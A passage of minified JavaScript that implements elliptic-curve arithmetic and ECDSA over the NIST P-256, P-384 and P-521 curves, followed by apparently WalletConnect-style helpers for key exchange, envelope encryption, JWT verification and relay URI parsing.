          , Fa = Bs + 1
          , Js = 2 * Bs + 1
          , Wa = el.length
          , Za = el[0]
          , tl = el.subarray(1);
        if (Wa === Fa && (Za === 2 || Za === 3)) {
            const za = Z.fromBytes(tl);
            if (!Z.isValid(za))
                throw new Error("bad point: is not on curve, wrong x");
            const Ws = Ss(za);
            let Ja;
            try {
                Ja = Z.sqrt(Ws)
            } catch (Ya) {
                const rl = Ya instanceof Error ? ": " + Ya.message : "";
                throw new Error("bad point: is not on curve, sqrt error" + rl)
            }
            ms();
            const Xa = Z.isOdd(Ja);
            return (Za & 1) === 1 !== Xa && (Ja = Z.neg(Ja)),
            {
                x: za,
                y: Ja
            }
        } else if (Wa === Js && Za === 4) {
            const za = Z.fromBytes(tl.subarray(Bs * 0, Bs * 1))
              , Ws = Z.fromBytes(tl.subarray(Bs * 1, Bs * 2));
            if (!Ts(za, Ws))
                throw new Error("bad point: is not on curve");
            return {
                x: za,
                y: Ws
            }
        } else
            throw new Error(`bad point: got length ${Wa}, expected compressed=${Fa} or uncompressed=${Js}`)
    }
    const _s = U.toBytes || Es
      , Is = U.fromBytes || vs
      , Ss = Uc(Z, q.a, q.b);
    function Ts(el, Bs) {
        const Fa = Z.sqr(Bs)
          , Js = Ss(el);
        return Z.eql(Fa, Js)
    }
    if (!Ts(q.Gx, q.Gy))
        throw new Error("bad curve params: generator point");
    const Rs = Z.mul(Z.pow(q.a, He$1), Oc)
      , Ns = Z.mul(Z.sqr(q.b), BigInt(27));
    if (Z.is0(Z.add(Rs, Ns)))
        throw new Error("bad curve params: a or b");
    function Hs(el, Bs, Fa=!1) {
        if (!Z.isValid(Bs) || Fa && Z.is0(Bs))
            throw new Error(`bad point coordinate ${el}`);
        return Bs
    }
    function ha(el) {
        if (!(el instanceof Ga))
            throw new Error("ProjectivePoint expected")
    }
    const pa = ho$1( (el, Bs) => {
        const {px: Fa, py: Js, pz: Wa} = el;
        if (Z.eql(Wa, Z.ONE))
            return {
                x: Fa,
                y: Js
            };
        const Za = el.is0();
        Bs == null && (Bs = Za ? Z.ONE : Z.inv(Wa));
        const tl = Z.mul(Fa, Bs)
          , za = Z.mul(Js, Bs)
          , Ws = Z.mul(Wa, Bs);
        if (Za)
            return {
                x: Z.ZERO,
                y: Z.ZERO
            };
        if (!Z.eql(Ws, Z.ONE))
            throw new Error("invZ was invalid");
        return {
            x: tl,
            y: za
        }
    }
    )
      , Zs = ho$1(el => {
        if (el.is0()) {
            if (U.allowInfinityPoint && !Z.is0(el.py))
                return;
            throw new Error("bad point: ZERO")
        }
        const {x: Bs, y: Fa} = el.toAffine();
        if (!Z.isValid(Bs) || !Z.isValid(Fa))
            throw new Error("bad point: x or y not field elements");
        if (!Ts(Bs, Fa))
            throw new Error("bad point: equation left != right");
        if (!el.isTorsionFree())
            throw new Error("bad point: not in prime-order subgroup");
        return !0
    }
    );
    function Qa(el, Bs, Fa, Js, Wa) {
        return Fa = new Ga(Z.mul(Fa.px, el),Fa.py,Fa.pz),
        Bs = le$1(Js, Bs),
        Fa = le$1(Wa, Fa),
        Bs.add(Fa)
    }
    class Ga {
        constructor(Bs, Fa, Js) {
            this.px = Hs("x", Bs),
            this.py = Hs("y", Fa, !0),
            this.pz = Hs("z", Js),
            Object.freeze(this)
        }
        static fromAffine(Bs) {
            const {x: Fa, y: Js} = Bs || {};
            if (!Bs || !Z.isValid(Fa) || !Z.isValid(Js))
                throw new Error("invalid affine point");
            if (Bs instanceof Ga)
                throw new Error("projective point not allowed");
            return Z.is0(Fa) && Z.is0(Js) ? Ga.ZERO : new Ga(Fa,Js,Z.ONE)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static normalizeZ(Bs) {
            return lc(Ga, "pz", Bs)
        }
        static fromBytes(Bs) {
            return at(Bs),
            Ga.fromHex(Bs)
        }
        static fromHex(Bs) {
            const Fa = Ga.fromAffine(Is(rt("pointHex", Bs)));
            return Fa.assertValidity(),
            Fa
        }
        static fromPrivateKey(Bs) {
            const Fa = To$1(oe, U.allowedPrivateKeyLengths, U.wrapPrivateKey);
            return Ga.BASE.multiply(Fa(Bs))
        }
        static msm(Bs, Fa) {
            return bc(Ga, oe, Bs, Fa)
        }
        precompute(Bs=8, Fa=!0) {
            return sl.setWindowSize(this, Bs),
            Fa || this.multiply(He$1),
            this
        }
        _setWindowSize(Bs) {
            this.precompute(Bs)
        }
        assertValidity() {
            Zs(this)
        }
        hasEvenY() {
            const {y: Bs} = this.toAffine();
            if (!Z.isOdd)
                throw new Error("Field doesn't support isOdd");
            return !Z.isOdd(Bs)
        }
        equals(Bs) {
            ha(Bs);
            const {px: Fa, py: Js, pz: Wa} = this
              , {px: Za, py: tl, pz: za} = Bs
              , Ws = Z.eql(Z.mul(Fa, za), Z.mul(Za, Wa))
              , Ja = Z.eql(Z.mul(Js, za), Z.mul(tl, Wa));
            return Ws && Ja
        }
        negate() {
            return new Ga(this.px,Z.neg(this.py),this.pz)
        }
        double() {
            const {a: Bs, b: Fa} = q
              , Js = Z.mul(Fa, He$1)
              , {px: Wa, py: Za, pz: tl} = this;
            let za = Z.ZERO
              , Ws = Z.ZERO
              , Ja = Z.ZERO
              , Xa = Z.mul(Wa, Wa)
              , Ya = Z.mul(Za, Za)
              , rl = Z.mul(tl, tl)
              , il = Z.mul(Wa, Za);
            return il = Z.add(il, il),
            Ja = Z.mul(Wa, tl),
            Ja = Z.add(Ja, Ja),
            za = Z.mul(Bs, Ja),
            Ws = Z.mul(Js, rl),
            Ws = Z.add(za, Ws),
            za = Z.sub(Ya, Ws),
            Ws = Z.add(Ya, Ws),
            Ws = Z.mul(za, Ws),
            za = Z.mul(il, za),
            Ja = Z.mul(Js, Ja),
            rl = Z.mul(Bs, rl),
            il = Z.sub(Xa, rl),
            il = Z.mul(Bs, il),
            il = Z.add(il, Ja),
            Ja = Z.add(Xa, Xa),
            Xa = Z.add(Ja, Xa),
            Xa = Z.add(Xa, rl),
            Xa = Z.mul(Xa, il),
            Ws = Z.add(Ws, Xa),
            rl = Z.mul(Za, tl),
            rl = Z.add(rl, rl),
            Xa = Z.mul(rl, il),
            za = Z.sub(za, Xa),
            Ja = Z.mul(rl, Ya),
            Ja = Z.add(Ja, Ja),
            Ja = Z.add(Ja, Ja),
            new Ga(za,Ws,Ja)
        }
        add(Bs) {
            ha(Bs);
            const {px: Fa, py: Js, pz: Wa} = this
              , {px: Za, py: tl, pz: za} = Bs;
            let Ws = Z.ZERO
              , Ja = Z.ZERO
              , Xa = Z.ZERO;
            const Ya = q.a
              , rl = Z.mul(q.b, He$1);
            let il = Z.mul(Fa, Za)
              , ol = Z.mul(Js, tl)
              , al = Z.mul(Wa, za)
              , cl = Z.add(Fa, Js)
              , ll = Z.add(Za, tl);
            cl = Z.mul(cl, ll),
            ll = Z.add(il, ol),
            cl = Z.sub(cl, ll),
            ll = Z.add(Fa, Wa);
            let ul = Z.add(Za, za);
            return ll = Z.mul(ll, ul),
            ul = Z.add(il, al),
            ll = Z.sub(ll, ul),
            ul = Z.add(Js, Wa),
            Ws = Z.add(tl, za),
            ul = Z.mul(ul, Ws),
            Ws = Z.add(ol, al),
            ul = Z.sub(ul, Ws),
            Xa = Z.mul(Ya, ll),
            Ws = Z.mul(rl, al),
            Xa = Z.add(Ws, Xa),
            Ws = Z.sub(ol, Xa),
            Xa = Z.add(ol, Xa),
            Ja = Z.mul(Ws, Xa),
            ol = Z.add(il, il),
            ol = Z.add(ol, il),
            al = Z.mul(Ya, al),
            ll = Z.mul(rl, ll),
            ol = Z.add(ol, al),
            al = Z.sub(il, al),
            al = Z.mul(Ya, al),
            ll = Z.add(ll, al),
            il = Z.mul(ol, ll),
            Ja = Z.add(Ja, il),
            il = Z.mul(ul, ll),
            Ws = Z.mul(cl, Ws),
            Ws = Z.sub(Ws, il),
            il = Z.mul(cl, ol),
            Xa = Z.mul(ul, Xa),
            Xa = Z.add(Xa, il),
            new Ga(Ws,Ja,Xa)
        }
        subtract(Bs) {
            return this.add(Bs.negate())
        }
        is0() {
            return this.equals(Ga.ZERO)
        }
        multiply(Bs) {
            const {endo: Fa} = U;
            if (!oe.isValidNot0(Bs))
                throw new Error("invalid scalar: out of range");
            let Js, Wa;
            const Za = tl => sl.wNAFCached(this, tl, Ga.normalizeZ);
            if (Fa) {
                const {k1neg: tl, k1: za, k2neg: Ws, k2: Ja} = Fa.splitScalar(Bs)
                  , {p: Xa, f: Ya} = Za(za)
                  , {p: rl, f: il} = Za(Ja);
                Wa = Ya.add(il),
                Js = Qa(Fa.beta, Xa, rl, tl, Ws)
            } else {
                const {p: tl, f: za} = Za(Bs);
                Js = tl,
                Wa = za
            }
            return Ga.normalizeZ([Js, Wa])[0]
        }
        multiplyUnsafe(Bs) {
            const {endo: Fa} = U
              , Js = this;
            if (!oe.isValid(Bs))
                throw new Error("invalid scalar: out of range");
            if (Bs === he$1 || Js.is0())
                return Ga.ZERO;
            if (Bs === pe$1)
                return Js;
            if (sl.hasPrecomputes(this))
                return this.multiply(Bs);
            if (Fa) {
                const {k1neg: Wa, k1: Za, k2neg: tl, k2: za} = Fa.splitScalar(Bs)
                  , {p1: Ws, p2: Ja} = gc(Ga, Js, Za, za);
                return Qa(Fa.beta, Ws, Ja, Wa, tl)
            } else
                return sl.wNAFCachedUnsafe(Js, Bs)
        }
        multiplyAndAddUnsafe(Bs, Fa, Js) {
            const Wa = this.multiplyUnsafe(Fa).add(Bs.multiplyUnsafe(Js));
            return Wa.is0() ? void 0 : Wa
        }
        toAffine(Bs) {
            return pa(this, Bs)
        }
        isTorsionFree() {
            const {isTorsionFree: Bs} = U;
            return et === pe$1 ? !0 : Bs ? Bs(Ga, this) : sl.wNAFCachedUnsafe(this, st).is0()
        }
        clearCofactor() {
            const {clearCofactor: Bs} = U;
            return et === pe$1 ? this : Bs ? Bs(Ga, this) : this.multiplyUnsafe(et)
        }
        toBytes(Bs=!0) {
            return Re("isCompressed", Bs),
            this.assertValidity(),
            _s(Ga, this, Bs)
        }
        toRawBytes(Bs=!0) {
            return this.toBytes(Bs)
        }
        toHex(Bs=!0) {
            return ce$1(this.toBytes(Bs))
        }
        toString() {
            return `<Point ${this.is0() ? "ZERO" : this.toHex()}>`
        }
    }
    Ga.BASE = new Ga(q.Gx,q.Gy,Z.ONE),
    Ga.ZERO = new Ga(Z.ZERO,Z.ONE,Z.ZERO),
    Ga.Fp = Z,
    Ga.Fn = oe;
    const nl = oe.BITS
      , sl = pc(Ga, U.endo ? Math.ceil(nl / 2) : nl);
    return Ga
}
function Ro$1(q) {
    return Uint8Array.of(q ? 2 : 3)
}
function Tc(q, U, Z={}) {
    ke$2(U, {
        hash: "function"
    }, {
        hmac: "function",
        lowS: "boolean",
        randomBytes: "function",
        bits2int: "function",
        bits2int_modN: "function"
    });
    const oe = U.randomBytes || Zt$1
      , et = U.hmac || ( (Js, ...Wa) => _e$2(U.hash, Js, Ht$1(...Wa)))
      , {Fp: st, Fn: ws} = q
      , {ORDER: ms, BITS: Es} = ws;
    function vs(Js) {
        const Wa = ms >> pe$1;
        return Js > Wa
    }
    function _s(Js) {
        return vs(Js) ? ws.neg(Js) : Js
    }
    function Is(Js, Wa) {
        if (!ws.isValidNot0(Wa))
            throw new Error(`invalid signature ${Js}: out of range 1..CURVE.n`)
    }
    class Ss {
        constructor(Wa, Za, tl) {
            Is("r", Wa),
            Is("s", Za),
            this.r = Wa,
            this.s = Za,
            tl != null && (this.recovery = tl),
            Object.freeze(this)
        }
        static fromCompact(Wa) {
            const Za = ws.BYTES
              , tl = rt("compactSignature", Wa, Za * 2);
            return new Ss(ws.fromBytes(tl.subarray(0, Za)),ws.fromBytes(tl.subarray(Za, Za * 2)))
        }
        static fromDER(Wa) {
            const {r: Za, s: tl} = vt$1.toSig(rt("DER", Wa));
            return new Ss(Za,tl)
        }
        assertValidity() {}
        addRecoveryBit(Wa) {
            return new Ss(this.r,this.s,Wa)
        }
        recoverPublicKey(Wa) {
            const Za = st.ORDER
              , {r: tl, s: za, recovery: Ws} = this;
            if (Ws == null || ![0, 1, 2, 3].includes(Ws))
                throw new Error("recovery id invalid");
            if (ms * Nc < Za && Ws > 1)
                throw new Error("recovery id is ambiguous for h>1 curve");
            const Ja = Ws === 2 || Ws === 3 ? tl + ms : tl;
            if (!st.isValid(Ja))
                throw new Error("recovery id 2 or 3 invalid");
            const Xa = st.toBytes(Ja)
              , Ya = q.fromHex(Ht$1(Ro$1((Ws & 1) === 0), Xa))
              , rl = ws.inv(Ja)
              , il = Zs(rt("msgHash", Wa))
              , ol = ws.create(-il * rl)
              , al = ws.create(za * rl)
              , cl = q.BASE.multiplyUnsafe(ol).add(Ya.multiplyUnsafe(al));
            if (cl.is0())
                throw new Error("point at infinify");
            return cl.assertValidity(),
            cl
        }
        hasHighS() {
            return vs(this.s)
        }
        normalizeS() {
            return this.hasHighS() ? new Ss(this.r,ws.neg(this.s),this.recovery) : this
        }
        toBytes(Wa) {
            if (Wa === "compact")
                return Ht$1(ws.toBytes(this.r), ws.toBytes(this.s));
            if (Wa === "der")
                return fn$1(vt$1.hexFromSig(this));
            throw new Error("invalid format")
        }
        toDERRawBytes() {
            return this.toBytes("der")
        }
        toDERHex() {
            return ce$1(this.toBytes("der"))
        }
        toCompactRawBytes() {
            return this.toBytes("compact")
        }
        toCompactHex() {
            return ce$1(this.toBytes("compact"))
        }
    }
    const Ts = To$1(ws, Z.allowedPrivateKeyLengths, Z.wrapPrivateKey)
      , Rs = {
        isValidPrivateKey(Js) {
            try {
                return Ts(Js),
                !0
            } catch {
                return !1
            }
        },
        normPrivateKeyToScalar: Ts,
        randomPrivateKey: () => {
            const Js = ms;
            return uc(oe(Eo$1(Js)), Js)
        }
        ,
        precompute(Js=8, Wa=q.BASE) {
            return Wa.precompute(Js, !1)
        }
    };
    function Ns(Js, Wa=!0) {
        return q.fromPrivateKey(Js).toBytes(Wa)
    }
    function Hs(Js) {
        if (typeof Js == "bigint")
            return !1;
        if (Js instanceof q)
            return !0;
        const Wa = rt("key", Js).length
          , Za = st.BYTES
          , tl = Za + 1
          , za = 2 * Za + 1;
        if (!(Z.allowedPrivateKeyLengths || ws.BYTES === tl))
            return Wa === tl || Wa === za
    }
    function ha(Js, Wa, Za=!0) {
        if (Hs(Js) === !0)
            throw new Error("first arg must be private key");
        if (Hs(Wa) === !1)
            throw new Error("second arg must be public key");
        return q.fromHex(Wa).multiply(Ts(Js)).toBytes(Za)
    }
    const pa = U.bits2int || function(Js) {
        if (Js.length > 8192)
            throw new Error("input is too large");
        const Wa = Ce$1(Js)
          , Za = Js.length * 8 - Es;
        return Za > 0 ? Wa >> BigInt(Za) : Wa
    }
      , Zs = U.bits2int_modN || function(Js) {
        return ws.create(pa(Js))
    }
      , Qa = je$1(Es);
    function Ga(Js) {
        return Nn$1("num < 2^" + Es, Js, he$1, Qa),
        ws.toBytes(Js)
    }
    function nl(Js, Wa, Za=sl) {
        if (["recovered", "canonical"].some(cl => cl in Za))
            throw new Error("sign() legacy options not supported");
        const {hash: tl} = U;
        let {lowS: za, prehash: Ws, extraEntropy: Ja} = Za;
        za == null && (za = !0),
        Js = rt("msgHash", Js),
        _o$1(Za),
        Ws && (Js = rt("prehashed msgHash", tl(Js)));
        const Xa = Zs(Js)
          , Ya = Ts(Wa)
          , rl = [Ga(Ya), Ga(Xa)];
        if (Ja != null && Ja !== !1) {
            const cl = Ja === !0 ? oe(st.BYTES) : Ja;
            rl.push(rt("extraEntropy", cl))
        }
        const il = Ht$1(...rl)
          , ol = Xa;
        function al(cl) {
            const ll = pa(cl);
            if (!ws.isValidNot0(ll))
                return;
            const ul = ws.inv(ll)
              , dl = q.BASE.multiply(ll).toAffine()
              , fl = ws.create(dl.x);
            if (fl === he$1)
                return;
            const hl = ws.create(ul * ws.create(ol + fl * Ya));
            if (hl === he$1)
                return;
            let pl = (dl.x === fl ? 0 : 2) | Number(dl.y & pe$1)
              , gl = hl;
            return za && vs(hl) && (gl = _s(hl),
            pl ^= 1),
            new Ss(fl,gl,pl)
        }
        return {
            seed: il,
            k2sig: al
        }
    }
    const sl = {
        lowS: U.lowS,
        prehash: !1
    }
      , el = {
        lowS: U.lowS,
        prehash: !1
    };
    function Bs(Js, Wa, Za=sl) {
        const {seed: tl, k2sig: za} = nl(Js, Wa, Za);
        return ec(U.hash.outputLen, ws.BYTES, et)(tl, za)
    }
    q.BASE.precompute(8);
    function Fa(Js, Wa, Za, tl=el) {
        const za = Js;
        Wa = rt("msgHash", Wa),
        Za = rt("publicKey", Za),
        _o$1(tl);
        const {lowS: Ws, prehash: Ja, format: Xa} = tl;
        if ("strict"in tl)
            throw new Error("options.strict was renamed to lowS");
        if (Xa !== void 0 && !["compact", "der", "js"].includes(Xa))
            throw new Error('format must be "compact", "der" or "js"');
        const Ya = typeof za == "string" || nn$1(za)
          , rl = !Ya && !Xa && typeof za == "object" && za !== null && typeof za.r == "bigint" && typeof za.s == "bigint";
        if (!Ya && !rl)
            throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");
        let il, ol;
        try {
            if (rl)
                if (Xa === void 0 || Xa === "js")
                    il = new Ss(za.r,za.s);
                else
                    throw new Error("invalid format");
            if (Ya) {
                try {
                    Xa !== "compact" && (il = Ss.fromDER(za))
                } catch (pl) {
                    if (!(pl instanceof vt$1.Err))
                        throw pl
                }
                !il && Xa !== "der" && (il = Ss.fromCompact(za))
            }
            ol = q.fromHex(Za)
        } catch {
            return !1
        }
        if (!il || Ws && il.hasHighS())
            return !1;
        Ja && (Wa = U.hash(Wa));
        const {r: al, s: cl} = il
          , ll = Zs(Wa)
          , ul = ws.inv(cl)
          , dl = ws.create(ll * ul)
          , fl = ws.create(al * ul)
          , hl = q.BASE.multiplyUnsafe(dl).add(ol.multiplyUnsafe(fl));
        return hl.is0() ? !1 : ws.create(hl.x) === al
    }
    return Object.freeze({
        getPublicKey: Ns,
        getSharedSecret: ha,
        sign: Bs,
        verify: Fa,
        utils: Rs,
        Point: q,
        Signature: Ss
    })
}
function Rc(q) {
    const U = {
        a: q.a,
        b: q.b,
        p: q.Fp.ORDER,
        n: q.n,
        h: q.h,
        Gx: q.Gx,
        Gy: q.Gy
    }
      , Z = q.Fp
      , oe = Yt$1(U.n, q.nBitLength)
      , et = {
        Fp: Z,
        Fn: oe,
        allowedPrivateKeyLengths: q.allowedPrivateKeyLengths,
        allowInfinityPoint: q.allowInfinityPoint,
        endo: q.endo,
        wrapPrivateKey: q.wrapPrivateKey,
        isTorsionFree: q.isTorsionFree,
        clearCofactor: q.clearCofactor,
        fromBytes: q.fromBytes,
        toBytes: q.toBytes
    };
    return {
        CURVE: U,
        curveOpts: et
    }
}
function $c(q) {
    const {CURVE: U, curveOpts: Z} = Rc(q)
      , oe = {
        hash: q.hash,
        hmac: q.hmac,
        randomBytes: q.randomBytes,
        lowS: q.lowS,
        bits2int: q.bits2int,
        bits2int_modN: q.bits2int_modN
    };
    return {
        CURVE: U,
        curveOpts: Z,
        ecdsaOpts: oe
    }
}
function Cc(q, U) {
    return Object.assign({}, U, {
        ProjectivePoint: U.Point,
        CURVE: q
    })
}
function Lc(q) {
    const {CURVE: U, curveOpts: Z, ecdsaOpts: oe} = $c(q)
      , et = _c(U, Z)
      , st = Tc(et, oe, Z);
    return Cc(q, st)
}
function Rn$1(q, U) {
    const Z = oe => Lc({
        ...q,
        hash: oe
    });
    return {
        ...Z(U),
        create: Z
    }
}
const $o$1 = {
    p: BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff"),
    n: BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),
    h: BigInt(1),
    a: BigInt("0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc"),
    b: BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),
    Gx: BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),
    Gy: BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5")
}
  , Co$1 = {
    p: BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff"),
    n: BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973"),
    h: BigInt(1),
    a: BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc"),
    b: BigInt("0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef"),
    Gx: BigInt("0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7"),
    Gy: BigInt("0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f")
}
  , Lo$1 = {
    p: BigInt("0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
    n: BigInt("0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409"),
    h: BigInt(1),
    a: BigInt("0x1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc"),
    b: BigInt("0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00"),
    Gx: BigInt("0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66"),
    Gy: BigInt("0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650")
}
  , jc = Yt$1($o$1.p)
  , kc = Yt$1(Co$1.p)
  , Pc = Yt$1(Lo$1.p)
  , Hc = Rn$1({
    ...$o$1,
    Fp: jc,
    lowS: !1
}, Ae);
Rn$1({
    ...Co$1,
    Fp: kc,
    lowS: !1
}, Yi),
Rn$1({
    ...Lo$1,
    Fp: Pc,
    lowS: !1,
    allowedPrivateKeyLengths: [130, 131, 132]
}, Wi);
const Dc = Hc
  , $n$1 = "base10"
  , tt = "base16"
  , Qt$1 = "base64pad"
  , De$1 = "base64url"
  , te = "utf8"
  , Cn$1 = 0
  , ee = 1
  , ge$1 = 2
  , Mc = 0
  , jo$1 = 1
  , be$1 = 12
  , Ln$1 = 32;
function Vc() {
    const q = Tn$1.utils.randomPrivateKey()
      , U = Tn$1.getPublicKey(q);
    return {
        privateKey: toString(q, tt),
        publicKey: toString(U, tt)
    }
}
function qc() {
    const q = Zt$1(Ln$1);
    return toString(q, tt)
}
function Kc(q, U) {
    const Z = Tn$1.getSharedSecret(fromString(q, tt), fromString(U, tt))
      , oe = Jf(Te$1, Z, void 0, void 0, Ln$1);
    return toString(oe, tt)
}
function Fc(q) {
    const U = Te$1(fromString(q, tt));
    return toString(U, tt)
}
function zc(q) {
    const U = Te$1(fromString(q, te));
    return toString(U, tt)
}
function jn$1(q) {
    return fromString(`${q}`, $n$1)
}
function Vt$1(q) {
    return Number(toString(q, $n$1))
}
function ko$1(q) {
    return q.replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")
}
function Po$1(q) {
    const U = q.replace(/-/g, "+").replace(/_/g, "/")
      , Z = (4 - U.length % 4) % 4;
    return U + "=".repeat(Z)
}
function Gc(q) {
    const U = jn$1(typeof q.type < "u" ? q.type : Cn$1);
    if (Vt$1(U) === ee && typeof q.senderPublicKey > "u")
        throw new Error("Missing sender public key for type 1 envelope");
    const Z = typeof q.senderPublicKey < "u" ? fromString(q.senderPublicKey, tt) : void 0
      , oe = typeof q.iv < "u" ? fromString(q.iv, tt) : Zt$1(be$1)
      , et = fromString(q.symKey, tt)
      , st = co$1(et, oe).encrypt(fromString(q.message, te))
      , ws = kn$1({
        type: U,
        sealed: st,
        iv: oe,
        senderPublicKey: Z
    });
    return q.encoding === De$1 ? ko$1(ws) : ws
}
function Zc(q) {
    const U = fromString(q.symKey, tt)
      , {sealed: Z, iv: oe} = Me$2({
        encoded: q.encoded,
        encoding: q.encoding
    })
      , et = co$1(U, oe).decrypt(Z);
    if (et === null)
        throw new Error("Failed to decrypt");
    return toString(et, te)
}
function Wc(q, U) {
    const Z = jn$1(ge$1)
      , oe = Zt$1(be$1)
      , et = fromString(q, te)
      , st = kn$1({
        type: Z,
        sealed: et,
        iv: oe
    });
    return U === De$1 ? ko$1(st) : st
}
function Yc(q, U) {
    const {sealed: Z} = Me$2({
        encoded: q,
        encoding: U
    });
    return toString(Z, te)
}
function kn$1(q) {
    if (Vt$1(q.type) === ge$1)
        return toString(concat([q.type, q.sealed]), Qt$1);
    if (Vt$1(q.type) === ee) {
        if (typeof q.senderPublicKey > "u")
            throw new Error("Missing sender public key for type 1 envelope");
        return toString(concat([q.type, q.senderPublicKey, q.iv, q.sealed]), Qt$1)
    }
    return toString(concat([q.type, q.iv, q.sealed]), Qt$1)
}
function Me$2(q) {
    const U = (q.encoding || Qt$1) === De$1 ? Po$1(q.encoded) : q.encoded
      , Z = fromString(U, Qt$1)
      , oe = Z.slice(Mc, jo$1)
      , et = jo$1;
    if (Vt$1(oe) === ee) {
        const Es = et + Ln$1
          , vs = Es + be$1
          , _s = Z.slice(et, Es)
          , Is = Z.slice(Es, vs)
          , Ss = Z.slice(vs);
        return {
            type: oe,
            sealed: Ss,
            iv: Is,
            senderPublicKey: _s
        }
    }
    if (Vt$1(oe) === ge$1) {
        const Es = Z.slice(et)
          , vs = Zt$1(be$1);
        return {
            type: oe,
            sealed: Es,
            iv: vs
        }
    }
    const st = et + be$1
      , ws = Z.slice(et, st)
      , ms = Z.slice(st);
    return {
        type: oe,
        sealed: ms,
        iv: ws
    }
}
function Xc(q, U) {
    const Z = Me$2({
        encoded: q,
        encoding: U == null ? void 0 : U.encoding
    });
    return Ho$1({
        type: Vt$1(Z.type),
        senderPublicKey: typeof Z.senderPublicKey < "u" ? toString(Z.senderPublicKey, tt) : void 0,
        receiverPublicKey: U == null ? void 0 : U.receiverPublicKey
    })
}
function Ho$1(q) {
    const U = (q == null ? void 0 : q.type) || Cn$1;
    if (U === ee) {
        if (typeof (q == null ? void 0 : q.senderPublicKey) > "u")
            throw new Error("missing sender public key");
        if (typeof (q == null ? void 0 : q.receiverPublicKey) > "u")
            throw new Error("missing receiver public key")
    }
    return {
        type: U,
        senderPublicKey: q == null ? void 0 : q.senderPublicKey,
        receiverPublicKey: q == null ? void 0 : q.receiverPublicKey
    }
}
function Jc(q) {
    return q.type === ee && typeof q.senderPublicKey == "string" && typeof q.receiverPublicKey == "string"
}
function Qc(q) {
    return q.type === ge$1
}
function Do$1(q) {
    const U = Buffer.from(q.x, "base64")
      , Z = Buffer.from(q.y, "base64");
    return concat([new Uint8Array([4]), U, Z])
}
function ta(q, U) {
    const [Z,oe,et] = q.split(".")
      , st = Buffer.from(Po$1(et), "base64");
    if (st.length !== 64)
        throw new Error("Invalid signature length");
    const ws = st.slice(0, 32)
      , ms = st.slice(32, 64)
      , Es = `${Z}.${oe}`
      , vs = Te$1(Es)
      , _s = Do$1(U);
    if (!Dc.verify(concat([ws, ms]), vs, _s))
        throw new Error("Invalid signature");
    return sn$2(q).payload
}
const Mo$1 = "irn";
function ea(q) {
    return (q == null ? void 0 : q.relay) || {
        protocol: Mo$1
    }
}
function na(q) {
    const U = C$1[q];
    if (typeof U > "u")
        throw new Error(`Relay Protocol not supported: ${q}`);
    return U
}
function Vo$1(q, U="-") {
    const Z = {}
      , oe = "relay" + U;
    return Object.keys(q).forEach(et => {
        if (et.startsWith(oe)) {
            const st = et.replace(oe, "")
              , ws = q[et];
            Z[st] = ws
        }
    }
    ),
    Z
}
function ra(q) {
    if (!q.includes("wc:")) {
        const vs = Qe$1(q);
        vs != null && vs.includes("wc:") && (q = vs)
    }
    q = q.includes("wc://") ? q.replace("wc://", "") : q,
    q = q.includes("wc:") ? q.replace("wc:", "") : q;
    const U = q.indexOf(":")
      , Z = q.indexOf("?") !== -1 ? q.indexOf("?") : void 0
      , oe = q.substring(0, U)
      , et = q.substring(U + 1, Z).split("@")
      , st = typeof Z < "u" ? q.substring(Z) : ""
      , ws = new URLSearchParams(st)
      , ms = {};
    ws.forEach( (vs, _s) => {
        ms[_s] = vs
    }
    );
    const Es = typeof ms.methods == "string" ? ms.methods.split(",") : void 0;
    return {
        protocol: oe,
        topic: qo$1(et[0]),
        version: parseInt(et[1], 10),
        symKey: ms.symKey,
        relay: Vo$1(ms),
        methods: Es,
        expiryTimestamp: ms.expiryTimestamp ? parseInt(ms.expiryTimestamp, 10) : void 0
    }
}
function qo$1(q) {
    return q.startsWith("//") ? q.substring(2) : q
}
function Ko$1(q, U="-") {
    const Z = "relay"
      , oe = {};
    return Object.keys(q).forEach(et => {
        const st = et
          , ws = Z + U + st;
        q[st] && (oe[ws] = q[st])
    }
    ),
    oe
}
function oa(q) {
    const U = new URLSearchParams
      , Z = Ko$1(q.relay);
    Object.keys(Z).sort().forEach(et => {
        U.set(et, Z[et])
    }
    ),
    U.set("symKey", q.symKey),
    q.expiryTimestamp && U.set("expiryTimestamp", q.expiryTimestamp.toString()),
    q.methods && U.set("methods", q.methods.join(","));
    const oe = U.toString();
    return `${q.protocol}:${q.topic}@${q.version}?${oe}`
